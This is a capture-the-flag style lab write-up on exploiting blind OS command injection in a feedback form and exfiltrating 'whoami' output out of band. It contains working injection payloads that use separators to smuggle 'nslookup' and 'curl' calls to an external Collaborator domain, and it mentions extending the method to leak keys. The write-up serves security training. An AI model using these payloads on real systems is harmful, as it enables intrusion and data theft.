

## 1. Initial reconnaissance
The lab reused the same feedback function pattern:

- Feedback form at `/feedback` with `name`, `email`, `subject`, and `message`.
- Submission to `POST /feedback/submit` with a CSRF token.

The description clarified that:
- There is blind OS command injection in the feedback function.
- Commands are executed asynchronously.
- No accessible writable directory is available for output redirection.
- The objective is to exfiltrate the output of `whoami` via an external DNS query (or HTTP request).

This made it clear that I needed an **out-of-band exfiltration** strategy.

## 2. Testing methodology
I prepared an external listener:

- Either a Burp Collaborator session, or
- My own DNS/HTTP server reachable at a domain or IP (e.g. `dns.public`, `http://public/`).

Then, to avoid missing the vulnerable parameter or mis-guessing the syntax, I reused the **Intruder-like Sniper script**:

- Target parameters: `name`, `email`, `subject`, `message`.
- Payload wrappers: the same `payload_base_list` with combinations such as `;<PAYLOAD>`, `&<PAYLOAD>`, `$('<PAYLOAD>')`, etc.
- `<PAYLOAD>`: an exfiltration command embedding `whoami`.

## 3. Payload construction
I considered two families of exfiltration payloads:

### DNS-based exfiltration
```bash
nslookup $(whoami).0vwnmm7szva3vvmf58rw532locu3it6i.oastify.com
;nslookup $(whoami).0vwnmm7szva3vvmf58rw532locu3it6i.oastify.com;
&nslookup $(whoami).0vwnmm7szva3vvmf58rw532locu3it6i.oastify.com&
```

When executed, the system would resolve a hostname like:
```text
peter-ID.0vwnmm7szva3vvmf58rw532locu3it6i.oastify.com
```

The username (`peter-ID`) appears as the left-most label.

### HTTP-based exfiltration
```bash
curl http://0vwnmm7szva3vvmf58rw532locu3it6i.oastify.com/$(whoami)
;curl http://0vwnmm7szva3vvmf58rw532locu3it6i.oastify.com/$(whoami);
```

This causes a request such as:
```http
GET /peter-ID HTTP/1.1
Host: 0vwnmm7szva3vvmf58rw532locu3it6i.oastify.com
```

In both cases, the exfiltrated data (`whoami` output) appears in the DNS query or HTTP path.

The script:
1. Retrieved a CSRF token from `/feedback`.
2. For each parameter and payload wrapper, injected the appropriate DNS or HTTP exfil payload.
3. Sent a POST request to `/feedback/submit`.

## 4. Completing the attack
After sending the batch of requests, I checked the external server:

- **For DNS**: In the Collaborator or DNS logs, I saw queries like:
  ```
  peter-ID.0vwnmm7szva3vvmf58rw532locu3it6i.oastify.com
  ```
- **For HTTP**: In HTTP access logs, I saw requests such as:
  ```
  GET /peter-ID HTTP/1.1
  Host: 0vwnmm7szva3vvmf58rw532locu3it6i.oastify.com
  ```

From either pattern, I extracted the username `peter-ID` as the result of `whoami` on the vulnerable server.

To complete the lab, I submitted `peter-ID` (or whatever the captured username was) in the solution form. This confirmed that:

- I had blind OS command execution.
- I successfully exfiltrated command output through an out-of-band channel using DNS/HTTP and command substitution.

In a real-world attack, this technique can be generalized to leak other sensitive information (e.g., environment variables, keys, configuration snippets) in small chunks via DNS or HTTP requests.
